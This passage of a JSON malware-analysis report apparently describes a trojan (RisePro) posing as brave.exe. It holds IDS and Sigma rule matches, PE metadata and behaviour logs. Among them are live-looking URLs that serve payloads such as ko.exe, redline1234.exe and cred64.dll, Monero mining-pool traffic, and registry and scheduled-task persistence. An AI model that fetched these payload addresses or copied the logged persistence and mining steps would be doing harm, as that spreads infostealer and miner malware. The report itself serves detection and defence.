          "rule_raw": "alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any ( msg:\"FILE-MULTIMEDIA Microsoft Windows Transport Stream Program Map Table Heap overflow attempt\"; flow:to_client,established; file_data; content:\"|47 40 00|\"; byte_test:2,>,1001,29,relative,bitmask 0xFFF; metadata:policy max-detect-ips drop; service:ftp-data,http,imap,pop3; reference:cve,2016-0101; reference:url,technet.microsoft.com/en-us/security/bulletin/MS16-027; classtype:attempted-user; sid:38124; rev:4; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-0101",
            "https://technet.microsoft.com/en-us/security/bulletin/MS16-027"
          ],
          "rule_id": "1:38124"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "POLICY-OTHER AutoItv3 Aut2Exe interpreter - compiled script",
          "rule_raw": "alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any ( msg:\"POLICY-OTHER AutoItv3 Aut2Exe interpreter - compiled script\"; flow:to_client,established; flowbits:isset,file.exe; file_data; content:\"|A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D|\",fast_pattern,nocase; content:\"AU3!EA0\"; service:ftp-data,http,imap,pop3; reference:url,autoitscript.com/autoit3/docs/intro/compiler.htm; reference:url,blog.didierstevens.com/2007/10/02/autoit-malware-revisited/; classtype:policy-violation; sid:40028; rev:3; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://autoitscript.com/autoit3/docs/intro/compiler.htm",
            "https://blog.didierstevens.com/2007/10/02/autoit-malware-revisited/"
          ],
          "rule_id": "1:40028"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "PUA-OTHER XMRig cryptocurrency mining pool connection attempt",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PUA-OTHER XMRig cryptocurrency mining pool connection attempt\"; flow:to_server,established; content:\"|22|method|22|\",nocase; content:\"|22|agent|22|\",nocase; content:\"|22|XMRig\",fast_pattern,nocase; metadata:policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; reference:url,github.com/xmrig/xmrig; classtype:policy-violation; sid:45549; rev:4; )",
          "alert_context": [
            {
              "dest_port": 80,
              "dest_ip": "95.179.241.203"
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://github.com/xmrig/xmrig"
          ],
          "rule_id": "1:45549"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "PUA-OTHER Cryptocurrency Miner outbound connection attempt",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PUA-OTHER Cryptocurrency Miner outbound connection attempt\"; flow:to_server,established; content:\"|7B 22|id|22 3A|\"; content:\"|22|jsonrpc|22 3A|\"; content:\"|22|method|22 3A 22|login|22 2C 22|params|22 3A 7B 22|login|22 3A|\"; content:\"|22|pass|22 3A|\"; content:\"|22|agent|22 3A|\"; metadata:policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; reference:url,virustotal.com/en/file/2b83c69cf32c5f8f43ec2895ec9ac730bf73e1b2f37e44a3cf8ce814fb51f120/analysis; classtype:policy-violation; sid:46237; rev:1; )",
          "alert_context": [
            {
              "dest_port": 80,
              "dest_ip": "95.179.241.203"
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://virustotal.com/en/file/2b83c69cf32c5f8f43ec2895ec9ac730bf73e1b2f37e44a3cf8ce814fb51f120/analysis"
          ],
          "rule_id": "1:46237"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "POLICY-OTHER HTTP request by IPv4 address attempt",
          "rule_raw": "alert tcp any any -> any $HTTP_PORTS ( msg:\"POLICY-OTHER HTTP request by IPv4 address attempt\"; flow:to_server,established; http_header; content:\"Host:\",fast_pattern,nocase; pcre:\"/^Host\\x3a\\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\\s*:?\\s*\\d*\\s*$/ims\"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )",
          "alert_context": [
            {
              "dest_port": 80,
              "dest_ip": "109.107.182.3"
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://www.w3.org/Protocols/rfc2616/rfc2616-sec15.html"
          ],
          "rule_id": "1:50447"
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY Possible External IP Lookup Domain Observed in SNI (ipinfo. io)",
          "rule_raw": "alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:\"ET POLICY Possible External IP Lookup Domain Observed in SNI (ipinfo. io)\"; flow:established,to_server; tls.sni; content:\"ipinfo.io\"; bsize:9; fast_pattern; classtype:external-ip-check; sid:2025331; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, affected_product Mac_OSX, affected_product Linux, attack_target Client_Endpoint, created_at 2018_02_07, deployment Perimeter, former_category POLICY, performance_impact Low, signature_severity Minor, updated_at 2022_03_24;)",
          "alert_context": [
            {
              "dest_port": 443,
              "ja3": [
                "1d095e68489d3c535297cd8dffb06cb9"
              ],
              "dest_ip": "34.117.186.192"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2025331"
        },
        {
          "rule_category": "Crypto Currency Mining Activity Detected",
          "alert_severity": "medium",
          "rule_msg": "ET COINMINER CoinMiner Domain in DNS Lookup (pool .hashvault .pro)",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET COINMINER CoinMiner Domain in DNS Lookup (pool .hashvault .pro)\"; dns.query; content:\"pool.hashvault.pro\"; nocase; bsize:18; classtype:coin-mining; sid:2036289; rev:1; metadata:created_at 2022_04_21, former_category COINMINER, performance_impact Significant, signature_severity Major, updated_at 2022_04_21;)",
          "alert_context": [
            {
              "dest_port": 53,
              "dest_ip": "8.8.8.8"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2036289"
        },
        {
          "rule_category": "Misc Attack",
          "alert_severity": "medium",
          "rule_msg": "ET DROP Spamhaus DROP Listed Traffic Inbound group 21",
          "rule_raw": "alert ip [185.127.68.0/22,185.127.76.0/22,185.129.8.0/22,185.129.208.0/22,185.130.36.0/22,185.132.8.0/22,185.134.48.0/22,185.144.180.0/22,185.147.140.0/22,185.161.148.0/22,185.165.24.0/22,185.189.73.0/24,185.193.90.0/24,185.215.113.0/24,185.215.132.0/22,185.230.44.0/22,185.232.45.0/24,185.237.104.0/22,185.237.226.0/23,185.238.176.0/22] any -> $HOME_NET any (msg:\"ET DROP Spamhaus DROP Listed Traffic Inbound group 21\"; reference:url,www.spamhaus.org/drop/drop.lasso; threshold: type limit, track by_src, seconds 3600, count 1; classtype:misc-attack; flowbits:set,ET.Evil; flowbits:set,ET.DROPIP; sid:2400020; rev:3802; metadata:affected_product Any, attack_target Any, deployment Perimeter, tag Dshield, signature_severity Minor, created_at 2010_12_30, updated_at 2023_11_15;)",
          "alert_context": [
            {
              "src_ip": "185.215.113.68",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.spamhaus.org/drop/drop.lasso"
          ],
          "rule_id": "1:2400020"
        },
        {
          "rule_category": "successful-recon-limited",
          "alert_severity": "medium",
          "rule_msg": "PROTOCOL-ICMP Unusual PING detected",
          "rule_raw": "alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PROTOCOL-ICMP Unusual PING detected\"; icode:0; itype:8; fragbits:!M; content:!\"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI\",depth 32; content:!\"0123456789abcdefghijklmnopqrstuv\",depth 32; content:!\"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\",depth 36; content:!\"WANG2\"; content:!\"cacti-monitoring-system\",depth 65; content:!\"SolarWinds\",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/",
            "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/"
          ],
          "rule_id": "1:29456"
        },
        {
          "rule_category": "Misc activity",
          "alert_severity": "low",
          "rule_msg": "ET INFO Packed Executable Download",
          "rule_raw": "alert http $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET INFO Packed Executable Download\"; flow:established,to_client; content:\"|0d 0a 0d 0a|MZ\"; isdataat:100,relative; content:\"This program \"; distance:0; content:\"PE|00 00|\"; distance:0; content:!\"data\"; within:400; content:!\"text\"; within:400; content:!\"rsrc\"; within:400; classtype:misc-activity; sid:2014819; rev:4; metadata:created_at 2012_05_30, former_category INFO, signature_severity Informational, updated_at 2012_05_30;)",
          "alert_context": [
            {
              "src_ip": "185.215.113.68",
              "url": "http://185.215.113.68/mine/amers.exe",
              "hostname": "185.215.113.68",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2014819"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO Executable Download from dotted-quad Host",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET INFO Executable Download from dotted-quad Host\"; flow:established,to_server; http.uri; content:\".exe\"; endswith; nocase; http.host; content:\".\"; offset:1; depth:3; content:\".\"; within:4; content:\".\"; within:4; pcre:\"/^(?:\\d{1,3}\\.){3}\\d{1,3}$/\"; http.request_line; content:\".exe HTTP/1.\"; fast_pattern; classtype:bad-unknown; sid:2016141; rev:8; metadata:attack_target Client_and_Server, created_at 2013_01_03, deployment Perimeter, former_category INFO, signature_severity Informational, updated_at 2020_09_14;)",
          "alert_context": [
            {
              "url": "http://109.107.182.3/cost/ko.exe",
              "hostname": "109.107.182.3",
              "dest_port": 80,
              "dest_ip": "109.107.182.3"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2016141"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download",
          "rule_raw": "alert http $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download\"; flowbits:isset,min.gethttp; flow:established,to_client; file_data; content:\"MZ\"; within:2; content:\"PE|00 00|\"; distance:0; classtype:bad-unknown; sid:2016538; rev:3; metadata:created_at 2013_03_06, updated_at 2013_03_06;)",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "url": "http://109.107.182.3/lego/redline1234.exe",
              "hostname": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2016538"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET MALWARE Terse alphanumeric executable downloader high likelihood of being hostile",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE Terse alphanumeric executable downloader high likelihood of being hostile\"; flow:established,to_server; http.uri; content:\"/\"; content:\".exe\"; distance:1; within:8; fast_pattern; endswith; pcre:\"/\\/[A-Z]?[a-z]{1,3}[0-9]?\\.exe$/\"; http.header; content:!\"koggames\"; http.host; content:!\"download.bitdefender.com\"; endswith; content:!\".appspot.com\"; endswith; content:!\"kaspersky.com\"; endswith; content:!\".sophosxl.net\"; endswith; http.header_names; content:!\"Referer\"; nocase; classtype:bad-unknown; sid:2019714; rev:12; metadata:created_at 2014_11_15, former_category CURRENT_EVENTS, updated_at 2020_09_16;)",
          "alert_context": [
            {
              "url": "http://109.107.182.3/cost/ko.exe",
              "hostname": "109.107.182.3",
              "dest_port": 80,
              "dest_ip": "109.107.182.3"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2019714"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
          "rule_raw": "alert http $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response\"; flow:established,to_client; flowbits:isset,http.dottedquadhost; file_data; content:\"MZ\"; within:2; content:\"PE|00 00|\"; distance:0; classtype:bad-unknown; sid:2021076; rev:2; metadata:created_at 2015_05_08, former_category INFO, updated_at 2015_05_08;)",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "url": "http://109.107.182.3/cost/ko.exe",
              "hostname": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2021076"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO Dotted Quad Host DLL Request",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET INFO Dotted Quad Host DLL Request\"; flow:established,from_client; flowbits:isset,http.dottedquadhost; flowbits:set,http.dottedquadhost.dll; flowbits:unset,http.dottedquadhost; http.request_line; content:\".dll HTTP/1.\"; nocase; fast_pattern; classtype:bad-unknown; sid:2027250; rev:4; metadata:attack_target Client_Endpoint, created_at 2019_04_23, deployment Perimeter, former_category INFO, performance_impact Moderate, signature_severity Minor, updated_at 2020_04_08;)",
          "alert_context": [
            {
              "url": "http://185.215.113.68/theme/Plugins/cred64.dll",
              "hostname": "185.215.113.68",
              "dest_port": 80,
              "dest_ip": "185.215.113.68"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2027250"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING Windows",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING Windows\"; itype:8; content:\"abcdefghijklmnop\",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:382"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING\"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:384"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP Echo Reply",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP Echo Reply\"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:408"
        },
        {
          "alert_severity": "low",
          "rule_msg": "SSLBL: Malicious JA3 SSL-Client Fingerprint detected (Tofsee)",
          "rule_raw": "alert tls any any -> any any (msg:\"SSLBL: Malicious JA3 SSL-Client Fingerprint detected (Tofsee)\"; ja3_hash; content:\"1d095e68489d3c535297cd8dffb06cb9\"; reference:url, sslbl.abuse.ch/ja3-fingerprints/1d095e68489d3c535297cd8dffb06cb9/; sid:906200054; rev:1;)",
          "alert_context": [
            {
              "ja3s": [
                "654097951f6c4ac92edde146d2427f05"
              ],
              "dest_port": 443,
              "ja3": [
                "1d095e68489d3c535297cd8dffb06cb9"
              ],
              "dest_ip": "104.26.4.15"
            }
          ],
          "rule_url": "https://sslbl.abuse.ch/blacklist/ja3_fingerprints.rules",
          "rule_source": "Abuse.ch Suricata JA3 Fingerprint Ruleset",
          "rule_references": [
            "https://sslbl.abuse.ch/ja3-fingerprints/1d095e68489d3c535297cd8dffb06cb9/"
          ],
          "rule_id": "1:906200054"
        },
        {
          "rule_category": "Potential Corporate Privacy Violation",
          "alert_severity": "info",
          "rule_msg": "ET POLICY Cryptocurrency Miner Checkin",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET POLICY Cryptocurrency Miner Checkin\"; flow:established,to_server; content:\"|7b 22|id|22 3a|\"; nocase; depth:6; content:\"|22|jsonrpc|22 3a|\"; nocase; distance:0; content:\"|22 2c 22|method|22 3a 22|login|22 2c 22|params|22 3a|\"; fast_pattern; content:\"|22|pass|22 3a 22|\"; nocase; content:\"|22|agent|22 3a 22|\"; nocase; content:!\"<title\"; nocase; content:!\"<script\"; nocase; content:!\"<html\"; nocase; classtype:policy-violation; sid:2024792; rev:5; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2017_10_02, deployment Perimeter, former_category POLICY, performance_impact Moderate, signature_severity Minor, updated_at 2023_03_06;)",
          "alert_context": [
            {
              "dest_port": 80,
              "dest_ip": "95.179.241.203"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2024792"
        }
      ],
      "pe_info": {
        "timestamp": 1706080695,
        "imphash": "baa93d47220682c04d92f7797d9224ce",
        "machine_type": 332,
        "entry_point": 6000640,
        "resource_details": [
          {
            "lang": "RUSSIAN",
            "chi2": 22249.25,
            "filetype": "unknown",
            "entropy": 4.723223686218262,
            "sha256": "876d100f5db4c3f01c764170aec8c3f1c0029116a88fb7262f4af0360abe799d",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 133135.8,
            "filetype": "unknown",
            "entropy": 4.164978504180908,
            "sha256": "e70e7f9596ec8abfd86573240b3bfe5ead222a41f3ec41e6283483ae23fcd8ca",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 357371,
            "filetype": "unknown",
            "entropy": 3.8329784870147705,
            "sha256": "fd32c758459cdd35e7eb6ba6c4be3b77d8d636d79cc6ebada262875099e117d5",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 3685.33,
            "filetype": "ICO",
            "entropy": 2.4584920406341553,
            "sha256": "6ab18c3b81a5d30c5a190a4504cae807d73b1a4d02d56ffddf641abbb62b7210",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 56038.49,
            "filetype": "unknown",
            "entropy": 3.42293119430542,
            "sha256": "986a459ecadee11977b6432d46d5185e1eb2271d1236a278fe13715b8fba90d9",
            "type": "RT_VERSION"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 4031.47,
            "filetype": "XML",
            "entropy": 4.911615371704102,
            "sha256": "4bb79dcea0a901f7d9eac5aa05728ae92acb42e0cb22e5dd14134f4421a3d8df",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_langs": {
          "RUSSIAN": 5,
          "ENGLISH US": 1
        },
        "resource_types": {
          "RT_ICON": 3,
          "RT_GROUP_ICON": 1,
          "RT_VERSION": 1,
          "RT_MANIFEST": 1
        },
        "sections": [
          {
            "chi2": 11670.24,
            "virtual_address": 4096,
            "flags": "rwx",
            "raw_size": 582144,
            "entropy": 7.99,
            "virtual_size": 1265664,
            "md5": "e69dc940de11d267d79199047ea5c09e"
          },
          {
            "name": ".rsrc",
            "chi2": 27217.95,
            "virtual_address": 1269760,
            "flags": "rw",
            "raw_size": 4608,
            "entropy": 7.33,
            "virtual_size": 16568,
            "md5": "ae336c557bddf35ff7b0dccf3b91e4b4"
          },
          {
            "name": ".idata",
            "chi2": 93002,
            "virtual_address": 1290240,
            "flags": "rw",
            "raw_size": 512,
            "entropy": 1.31,
            "virtual_size": 4096,
            "md5": "37f5282c0fa356b1e50be5becbf91e72"
          },
          {
            "chi2": 123996,
            "virtual_address": 1294336,
            "flags": "rwx",
            "raw_size": 512,
            "entropy": 0.26,
            "virtual_size": 2932736,
            "md5": "5792c4aa21a1ed1294d41a277c1cff03"
          },
          {
            "name": "oncnjimx",
            "chi2": 142045.3,
            "virtual_address": 4227072,
            "flags": "rwx",
            "raw_size": 1773056,
            "entropy": 7.95,
            "virtual_size": 1773568,
            "md5": "cb88ebb9a07da5f6025d284c474a8e22"
          },
          {
            "name": "hmzswazj",
            "chi2": 35479,
            "virtual_address": 6000640,
            "flags": "rwx",
            "raw_size": 512,
            "entropy": 4.22,
            "virtual_size": 4096,
            "md5": "4d58fd8918cae02036a3324b09432a17"
          }
        ],
        "compiler_product_versions": [
          "[ C ] VS2022 v17.4.0 pre 2.0 build 31823 count=18",
          "[ASM] VS2022 v17.4.0 pre 2.0 build 31823 count=24",
          "[C++] VS2022 v17.4.0 pre 2.0 build 31823 count=85",
          "[---] Unmarked objects count=281",
          "[---] Resource count=1",
          "id: 0x103, version: 30795 count=13",
          "id: 0x105, version: 30795 count=193",
          "id: 0x107, version: 30795 count=1",
          "id: 0xfd, version: 31823 count=4",
          "id: 0x104, version: 30795 count=25",
          "id: 0x106, version: 30795 count=1",
          "id: 0x101, version: 30795 count=25",
          "id: 0x109, version: 31947 count=28",
          "id: 0xff, version: 31947 count=1",
          "id: 0x102, version: 31947 count=1"
        ],
        "rich_pe_header_hash": "bdaa798c33c62da37f2c8e94ea08399c",
        "import_list": [
          {
            "library_name": "kernel32.dll",
            "imported_functions": [
              "lstrcpy"
            ]
          },
          {
            "library_name": "comctl32.dll",
            "imported_functions": [
              "InitCommonControls"
            ]
          }
        ]
      },
      "trid": [
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 32.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 28.9
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 13
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 12.8
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 12.8
        }
      ],
      "reputation": 0,
      "sigma_analysis_stats": {
        "high": 6,
        "medium": 5,
        "critical": 0,
        "low": 0
      },
      "signature_info": {
        "product": "Brave Browser",
        "description": "Brave Browser",
        "copyright": "Copyright (C) Brave",
        "original name": "brave.exe",
        "file version": "120.1.61.120",
        "internal name": "brave.exe"
      },
      "type_description": "Win32 EXE",
      "tags": [
        "malware",
        "spreader",
        "executes-dropped-file",
        "peexe",
        "detect-debug-environment",
        "cve-2016-0101",
        "exploit"
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 6,
          "medium": 5,
          "critical": 0,
          "low": 0
        }
      },
      "type_tag": "peexe",
      "popular_threat_classification": {
        "popular_threat_category": [
          {
            "count": 24,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 7,
            "value": "risepro"
          },
          {
            "count": 3,
            "value": "themida"
          }
        ],
        "suggested_threat_label": "trojan.risepro/themida"
      },
      "creation_date": 1706080695,
      "sigma_analysis_results": [
        {
          "match_context": [
            {
              "values": {
                "query": "pool.hashvault.pro"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "0752dd4f3de82ada650a6c6ed1887cc940d8f55e130fec468ce0df9b2ec4ef25",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Monero Crypto Coin Mining Pool Lookup",
          "rule_description": "Detects suspicious DNS queries to Monero mining pools",
          "rule_author": "Florian Roth (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "%TEMP%\\d887ceb89d\\",
                "TargetObject": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "0799d32e125d6df849ced4dc75e232438c118a816477d3f80a390cbd8b4d07ef",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Modify User Shell Folders Startup Value",
          "rule_description": "Detect modification of the startup key to a path where a payload could be stored to be launched during startup",
          "rule_author": "frack113"
        },
        {
          "match_context": [
            {
              "values": {
                "DestinationHostname": "pool.hashvault.pro",
                "Initiated": "true",
                "DestinationPort": "80",
                "DestinationIp": "95.179.241.203"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "5f96c8ad390b56fba16309ec092ccde0290c7896bd2bfd7c49b738c77dc36bde",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Network Communication With Crypto Mining Pool",
          "rule_description": "Detects initiated network connections to crypto mining pools",
          "rule_author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "%WINDIR%\\TEMP\\rljxappkaarw.sys",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\WinRing0_1_2_0\\ImagePath"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "71686ca6fd31ecd29454e2d39e38be5c971f96ad539e461b7d1d79b85f90182a",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Service Binary in Suspicious Folder",
          "rule_description": "Detect the creation of a service with a service binary located in a suspicious directory",
          "rule_author": "Florian Roth (Nextron Systems), frack113"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "\\xda\\xb3\\x47\\x89\\x30\\x3a\\x3a\\x6b\\xc5\\x0c\\xa7\\x14\\x0f\\x66\\x3d\\x8e\\x28\\x0f\\xd1\\x5f\\xa0\\x38\\xa7\\x5b\\x44\\xb8\\xfd\\xa9\\xe0\\xa5\\x40\\xb3",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{2CBE2503-E676-4D38-9E96-C46F526AE1AF}\\Hash"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "\\MPGPH131 HR",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{2CBE2503-E676-4D38-9E96-C46F526AE1AF}\\Path"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "{2CBE2503-E676-4D38-9E96-C46F526AE1AF}",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MPGPH131 HR\\Id"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "\\x76\\x94\\xab\\xdc\\xe8\\x2f\\x64\\xce\\x52\\x87\\x2a\\x11\\x5f\\xc6\\xcb\\x9d\\x7a\\x68\\xad\\xef\\x14\\x5a\\xde\\x5c\\x64\\xb3\\xb0\\x07\\x19\\xb6\\x14\\x7d",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{920E9407-49E4-4CCC-9E37-B50D0318B101}\\Hash"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "0x00000003",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MPGPH131 HR\\Index"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "d62173552d7fce98c24a7040b784edf35cc6650d2e68ecf2d04f40c58d58cfda",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Scheduled TaskCache Change by Uncommon Program",
          "rule_description": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
          "rule_author": "Syed Hasan (@syedhasan009)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "CommandLine": "%WINDIR%\\system32\\svchost.exe",
                "Image": "C:\\Windows\\system32\\svchost.exe"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "dc04e64e69f5446c2a31920ee22415626307d5f3d0fb73ad81b9d3301a41000a",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspect Svchost Activity",
